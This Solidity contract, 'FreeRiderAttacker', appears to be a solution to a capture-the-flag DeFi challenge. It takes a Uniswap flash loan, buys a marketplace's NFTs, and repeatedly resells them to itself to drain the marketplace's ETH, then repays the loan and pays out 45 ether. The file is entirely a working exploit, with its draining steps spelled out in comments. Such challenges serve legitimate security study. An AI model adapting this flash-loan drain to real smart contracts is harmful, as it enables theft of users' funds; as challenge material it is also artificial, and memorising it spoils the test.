// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "solmate/src/tokens/WETH.sol";
import "./FreeRiderNFTMarketplace.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    address owner;
    IUniswapV2Pair pair;
    WETH weth;
    FreeRiderNFTMarketplace market;
    address devs;

    constructor(
        IUniswapV2Pair _pair,
        WETH _weth,
        FreeRiderNFTMarketplace _market,
        address _devs
    ) payable {
        owner = msg.sender;
        pair = _pair;
        weth = _weth;
        market = _market;
        devs = _devs;
    }

    // 1. Loan 6 * 15+ ETH from Uniswap
    // 2. Buy all NFTs
    // 3. Re-sell one NFT to myself multiple times to drain enough funds from the market
    // 4. Repay the loan to Uniswap
    // 5. Approve the devs to take the NFTs

    uint256 NFTS = 6;
    uint256 NFT_PRICE = 15 ether;
    uint256 EXTRA_ETH = 1 ether;

    function attack() external {
        require(msg.sender == owner, "not owner");

        uint256 wethAmount = NFT_PRICE + EXTRA_ETH;

        weth.deposit{value: calcFee(wethAmount)}();

        bytes memory data = abi.encode("0x");
        pair.swap(wethAmount, 0, address(this), data);
    }

    function calcFee(uint256 amount) private pure returns (uint256) {
        return (amount * 3) / 997 + 1;
    }

    function drainSomeFunds() private {
        uint256[] memory tokens = new uint256[](NFTS);
        for (uint256 i = 0; i < NFTS; i++) {
            tokens[i] = i;
        }

        uint256 drainPrice = (EXTRA_ETH * 95) / 100 + 1;
        uint256[] memory prices = new uint256[](NFTS);
        for (uint256 i = 0; i < NFTS; i++) {
            prices[i] = drainPrice;
        }

        market.token().setApprovalForAll(address(market), true);
        market.offerMany(tokens, prices);
        market.buyMany{value: drainPrice}(tokens);
    }

    function buyTokens() private {
        uint256[] memory tokens = new uint256[](NFTS);
        for (uint256 i = 0; i < NFTS; i++) {
            tokens[i] = i;
        }

        weth.withdraw(NFT_PRICE);
        market.buyMany{value: NFT_PRICE}(tokens);
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata // data
    ) external {
        require(msg.sender == address(pair), "not pair");
        require(sender == address(this), "not sender");
        require(amount1 == 0, "not a loan");
        require(amount0 >= NFT_PRICE, "not enough");

        buyTokens();
        drainSomeFunds();
        drainSomeFunds();
        drainSomeFunds();

        weth.deposit{value: NFT_PRICE}();
        uint256 amountToRepay = amount0 + calcFee(amount0);
        weth.transfer(address(pair), amountToRepay);

        require(market.token().ownerOf(0) == address(this), "A");

        bytes memory data = abi.encode((address(this)));
        for (uint256 i = 0; i < NFTS; i++) {
            market.token().safeTransferFrom(address(this), devs, i, data);
        }

        require(market.token().ownerOf(0) == address(devs), "B");

        payable(owner).send(45 ether);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 tokenId,
        bytes calldata
    ) external pure override returns (bytes4) {
        require(tokenId < 6, "unknown token");

        return IERC721Receiver.onERC721Received.selector;
    }
}
